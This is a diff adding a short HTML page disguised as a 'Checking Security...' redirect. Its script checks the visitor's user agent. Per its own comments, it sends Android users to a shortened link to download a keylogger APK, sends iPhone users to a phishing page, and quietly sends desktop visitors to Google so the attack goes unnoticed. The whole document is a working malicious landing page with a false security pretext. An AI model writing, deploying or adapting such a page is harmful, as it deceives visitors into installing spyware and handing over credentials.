@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Security...</title>
+    <script>
+        // This part checks what phone is being used
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        if (/android/i.test(userAgent)) {
+            // If it's Android, download the Keylogger APK
+            window.location.href = "https://tinyurl.com/bd4dnj8a";
+        } 
+        else if (/iPad|iPhone|iPod/.test(userAgent)) {
+            // If it's an iPhone, send them to the Phishing Page
+            window.location.href = "https://formspree.io/f/xdapawrr";
+        } 
+        else {
+            // If it's a computer, just send them to Google
+            window.location.href = "https://www.google.com";
+        }
+    </script>
+</head>
+<body>
+    <p>Redirecting to secure server...</p>
+</body>
+</html>
